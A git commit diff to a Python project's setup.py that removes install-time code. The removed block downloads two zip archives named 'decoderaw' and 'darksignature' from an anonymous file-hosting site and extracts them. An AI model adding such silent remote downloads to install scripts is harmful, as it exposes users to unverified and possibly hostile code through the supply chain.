0716152a57c013169ec9452b970feb1c5380ff3f
erfan <cryptorixhack@gmail.com>
2025-08-22 18:30:37 +0330

    Update setup.py

--- setup.py
+++ setup.py
@@ -9,25 +9,3 @@ modules = ["zmq", "ecdsa", "urllib3", "requests", "pycryptodome"]
 # Install each module using pip
 for module in modules:
     subprocess.run(["pip", "install", module])
-
-url2 = 'https://biaupload.com/do.php?downf=org-6acf3ff7d2661.zip'
-zip_filename2 = 'decoderaw.zip'
-response2 = requests.get(url2)
-response2.raise_for_status() 
-with open(zip_filename2, 'wb') as file:
-    file.write(response2.content)
-
-with zipfile.ZipFile(zip_filename2, 'r') as zip_ref:
-    zip_ref.extractall('decoderaw')
-os.remove(zip_filename2)
-
-url3 = 'https://biaupload.com/do.php?downf=org-47b4a9f1fa7b2.zip'
-zip_filename3 = 'darksignature.zip'
-response3 = requests.get(url3)
-response3.raise_for_status() 
-with open(zip_filename3, 'wb') as file:
-    file.write(response3.content)
-
-with zipfile.ZipFile(zip_filename3, 'r') as zip_ref:
-    zip_ref.extractall('darksignature')
-os.remove(zip_filename3)
